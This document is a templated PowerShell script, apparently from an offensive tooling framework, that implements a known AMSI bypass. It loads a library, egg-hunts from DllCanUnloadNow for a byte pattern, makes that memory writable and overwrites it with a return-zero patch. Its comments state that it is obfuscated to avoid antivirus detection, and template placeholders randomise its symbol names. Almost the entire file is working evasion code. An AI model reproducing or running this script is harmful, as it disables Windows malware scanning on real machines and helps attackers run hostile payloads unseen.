{# https://www.contextis.com/en/blog/amsi-bypass #}
{# Obfuscated to avoid AV detection #}
{# Credits: @am0nsec #}

Add-Type $string8

Class {{symbol_name("Hunter")}} {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

[IntPtr]$hModule = [Kernel32]::LoadLibrary($string9)

[IntPtr]${{symbol_name("dllCanUnloadNowAddress")}} = [Kernel32]::GetProcAddress($hModule, $string12)

If ([IntPtr]::Size -eq 8) {
    [byte[]]$egg = [System.Convert]::FromBase64String($string10)
} Else {
    [byte[]]$egg = [System.Convert]::FromBase64String($string11)
}
[IntPtr]${{symbol_name("targetedAddress")}} = [{{symbol_name("Hunter")}}]::FindAddress(${{symbol_name("dllCanUnloadNowAddress")}}, $egg)

$buffer = 0
[Kernel32]::VirtualProtect(${{symbol_name("targetedAddress")}}, [uint32]2, 4, [ref]$buffer) | Out-Null

$patch = [byte[]] (0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, ${{symbol_name("targetedAddress")}}, 3)

$a = 0
[Kernel32]::VirtualProtect(${{symbol_name("targetedAddress")}}, [uint32]2, $buffer, [ref]$a) | Out-Null

